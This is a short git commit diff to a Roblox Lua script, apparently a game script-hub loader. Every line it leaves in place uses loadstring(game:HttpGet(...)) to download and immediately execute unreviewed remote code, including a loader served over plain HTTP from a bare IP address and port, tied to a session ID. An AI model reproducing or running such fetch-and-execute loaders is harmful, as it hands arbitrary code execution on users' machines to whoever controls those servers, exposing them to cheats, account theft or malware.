0ea3454049cf58bfe7cf55fe5a3428a541da6cd7
ZephyrHub1 <quanghaha10092008@gmail.com>
2025-09-10 20:52:32 +0700

    Update Main.lua

--- Main.lua
+++ Main.lua
@@ -1,4 +1,3 @@
-local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkdark/dark/-/raw/main/Spawner.lua"))()
-Spawner.Load()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZusumeHub/ZusumeHub/refs/heads/main/UpdateZysume"))()
 ID="b5bd87ab-c631-494c-9b65-aa0f5b823563";
 loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
